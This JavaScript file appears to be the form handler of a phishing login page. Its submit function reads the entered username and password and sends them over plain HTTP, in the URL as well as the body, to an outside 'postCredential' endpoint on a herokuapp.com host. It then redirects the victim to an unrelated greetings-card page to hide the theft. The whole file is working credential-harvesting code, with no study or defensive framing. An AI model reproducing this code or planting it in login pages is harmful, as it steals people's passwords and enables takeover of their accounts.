function setPostHeaders(body, isJsonBody = true) {
    const h = {};
    h.Accept = 'application/json';
    h['Content-Type'] = 'application/json';

    return {
        method: 'POST',
        headers: h,
        body: isJsonBody ? JSON.stringify(body) : body,
    };
}

const handleSubmit = (e) => {
    const u = document.getElementById('inpName') || '';
    const p = document.getElementById('inpPass') || '';
    const { value: uv = '' } = u;
    const { value: pv = '' } = p;

    if (!uv) {
        u.focus();
        return;
    }
    if (!pv) {
        p.focus();
        return;
    }

    fetch(`http://media-store.herokuapp.com/api/media/postCredential?uname=${uv}&upass=${pv}`, setPostHeaders({ uname: uv, upass: pv }))
        .then((res) => (window.location.href = 'https://www.123greetings.com/friendship/thoughts/thoughts76.html'))
        .catch((err) => console.log(err));
};

(function() {})();
